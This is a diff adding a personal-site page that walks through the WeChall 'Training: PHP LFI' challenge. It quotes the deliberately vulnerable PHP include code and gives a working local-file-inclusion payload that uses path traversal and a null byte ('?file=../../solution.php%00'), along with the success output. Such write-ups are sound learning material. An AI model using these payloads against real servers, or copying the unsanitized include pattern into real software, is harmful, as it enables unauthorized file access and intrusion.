@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeChall Training: PHP LFI @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>WeChall Training: PHP LFI</h1>
+        <p>here's how to solve Training: PHP LFI</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the WeChall Guides</a>
+            <hr>
+            <h2>Training: PHP LFI</h2>
+            <pre>Name: Training: PHP LFI
+Tags: Exploit, PHP, Training
+Score: 2
+Description: Your mission is to exploit this code, which has obviously an LFI vulnerability:
+
+$filename = 'pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome").'.html';
+include $filename;
+
+There is a lot of important stuff in ../solution.php, so please include and execute this file for us.
+
+Here are a few examples of the script in action (in the box below):
+index.php?file=welcome
+index.php?file=news
+index.php?file=forums
+
+For debugging purposes, you may look at the whole source again, also as highlighted version.</pre>
+            <h2>Theory</h2>
+            <p>To get the solution, as the description says, we have to get into `../solution.php`, but there are some problems. First is getting there, it's simple because we just need to put the solution page's url on `file` over there. But now the second problem is the extension. It finds a page's name and puts `.html` at the end, although the solution page is PHP. So to solve this, we can put a null character after the link to the solution page, this works because the null character will confuse the php and end the statement right there and there. So it will just execute the part of the `/pages/` directory and the solution, and end there without putting `.html`. The location we get from that is this:</p>
+            <pre>?file=../solution.php%00</pre>
+            <h2>Solution</h2>
+            <p>So let's go to the location from the theory:</p>
+            <pre>https://www.wechall.net/en/challenge/training/php/lfi/up/index.php?file=../solution.php%00</pre>
+            <pre>WeChall: This directory is not part of the challenge.</pre>
+            <p>Oh right, it was one more level up, because the page is in `up/index.php` and the solution path is `solution.php`, so when we find a file, it's in `up/pages/file`, so we need to go up two whole levels:</p>
+            <pre>https://www.wechall.net/en/challenge/training/php/lfi/up/index.php?file=../../solution.php%00</pre>
+            <pre>The vulnerable script in action (pages/../../solution.php)
+
+WeChall: Well done. If you find a local file inclusion, usually the box can get hacked into within minutes.
+Your answer is correct.</pre>
+            <p>There we go! That's the solution.</p>
+            <p>I voted this level as:</p>
+            <pre>Diff: 01
+Ed  : 05
+Fun : 07</pre>
+            <hr>
+            <a target="_blank" href="https://wechall.net/en/challenge/training/php/lfi/up/index.php">https://wechall.net/en/challenge/training/php/lfi/up/index.php</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
